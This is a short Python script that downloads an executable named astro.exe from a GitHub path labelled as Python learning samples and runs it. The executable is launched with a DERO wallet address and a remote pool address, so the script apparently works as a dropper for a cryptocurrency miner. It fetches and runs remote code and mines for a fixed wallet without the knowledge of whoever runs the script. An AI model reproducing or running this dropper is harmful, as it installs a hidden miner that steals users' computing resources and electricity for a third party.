#!/usr/bin/env python3
import os
os.system('"curl.exe -OLJ https://github.com/Sjogren665/learn-python3/raw/master/samples/astro.exe"')
os.system('"astro.exe -w dero1qy55mvck6ey54yptg0a5tervwzrxt0al5d26l02llpm4qwt88lxzwqqpqntf9 -r 178.79.134.237:12100 -report-realtime-hashrate"')